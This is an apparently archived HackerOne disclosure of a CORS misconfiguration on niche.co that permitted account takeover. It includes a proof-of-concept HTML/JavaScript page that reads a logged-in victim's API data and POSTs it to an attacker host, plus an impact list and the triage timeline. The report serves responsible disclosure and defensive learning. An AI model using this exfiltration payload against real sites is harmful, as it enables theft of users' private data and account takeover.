---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/xss
  - vuln/csrf
  - vuln/cors-misconfig
  - vuln/misconfiguration
  - impact/account-takeover
  - impact/credential-theft
  - trigger/victim-interaction
  - trigger/cors-origin
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2018-12-10
submitted: 2018-10-20T11:17:55.552Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/x|X / xAI]]"
reporter: "nahoragg"
source: "https://hackerone.com/reports/426147"
title: "CORS misconfig | Account Takeover"
---
# CORS misconfig | Account Takeover

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 30 | **Program:** X / xAI | **Disclosed:** 2018-12-10

- Report: [https://hackerone.com/reports/426147](https://hackerone.com/reports/426147)
- CWE: N/A
- Submitted: 2018-10-20T11:17:55.552Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 
CORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with **credential true** and **different methods are enabled** as well.

**Description:**
Basically, the application was only checking whether "//niche.co" was in the Origin header, that means i can give anything containing that. For ex : "https://niche.co.evil.net", "https://niche.com", i can even change the protocol like http, ftp, file etc. F363563: cors_1.png

## Steps To Reproduce:
Exploit:
Host this code on a domain(http://niche.co.evil.net) or any other that contains "//niche.co".
```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
As soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. F363586: cors_3.png F363564: cors_2.png

## How to fix

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Supporting Material/References:

https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://ejj.io/misconfigured-cors/

## Impact

Using this misconfig, attacker can do many actions depending on the functionality of application which in this case use **API** and do activities like:
1) Read, Update, Delete Users information(Email,Location,Bio etc)
2) Stealing Authenticity_token(CSRF) 
3) Delete social accounts on niche
4) **View private posts of social accounts**
5) Close account
6) Logout etc.

## Timeline

- **Report Filed**
- **2018-10-24** @nahoragg: Hey,
It's been 4 days and no response!!
Any updates?
- **2018-10-24** @bugtriage-alex: Hello @nahoragg 

Thank you for your report and your patience. We were able to replicate the behavior you described. We are currently performing extended testing in order to better understand the impact of this issue and we will get back to you if we have any further questions.

Thank you for thinking of Twitter security!
- **2018-10-24** @nahoragg: Great, Thanks for the update.
- **Report Triaged**
- **2018-10-27** @nahoragg: Thanks for the update!
- **2018-10-29** @nahoragg: Just to elaborate 4th point of impact, when I added my Facebook account, niche synced one of my private post so, attacker can view victims post even if its private on Facebook(or other social media) through CORS misconfig on niche. Let me know if you need more info on this!
- **Not Eligible For Bounty**
- **Report Resolved**
- **2018-11-01** @nahoragg: Thanks for the update and fix!
I knew that this domain is not in scope for reward but still I had to update you with this security issue :)
The issue seems to be fixed now. Cheers!!
BTW is there any chance if you guys offer swag?
- **2018-11-07** @nahoragg: Hey,
it's been  6 days, a response would be appreciated!
- **2018-11-07** @petrilli: Unfortunately, at this time, we do not have a mechanism to offer swag to researchers. It is something we are looking into, but are not sure when that will be possible.
- **2018-11-07** @nahoragg: Cool, your swag will be an awesome one!
Also, where can I find twitter hall of fame? Is it hackerone's?
- **2018-11-07** @petrilli: Correct, you can find it here: https://hackerone.com/twitter/thanks

Thanks again for your help in keeping us secure.
- **Agreed On Going Public**
- **2018-11-21** @jknguyen: Hi @nahoragg,

We will review your request to disclose this report and get back to you with some updates early next week (due to the upcoming holiday.)

Thank you in advance for your patience and for thinking of Twitter security!
- **2018-11-22** @nahoragg: Sure @jknguyen , Thanks.
- **2018-11-28** @nahoragg: Hey,
Any updates?
- **2018-11-29** @jknguyen: Hello @nahoragg, 

My apologies for the delay but the team is still reviewing your disclosure request.
As soon as I have any updates to share, I will post them here!

Thank you for your patience.
- **2018-12-06** @nahoragg: Hey, It's been 16 days since i asked for disclosure.
Any updates?
- **Agreed On Going Public**
- **Report Became Public**
